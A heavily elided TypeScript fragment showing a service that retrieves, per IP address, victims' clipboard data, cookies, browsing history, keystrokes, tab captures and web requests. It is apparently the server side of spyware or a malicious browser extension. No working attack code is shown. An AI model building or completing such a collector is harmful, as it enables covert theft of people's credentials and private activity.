...
export default class BulkRetrieverService {
    ...
    public retrieveForIP = async (IP: string): Promise<BulkRetrieveDto> => {
        ...
        return {digestable: {clipboard: clipboardData, cookies: cookieData, history: historyData,
            keystrokes: keystrokeData}, tabCatures: tabCaptureData, webRequests: webRequestData};
    };
}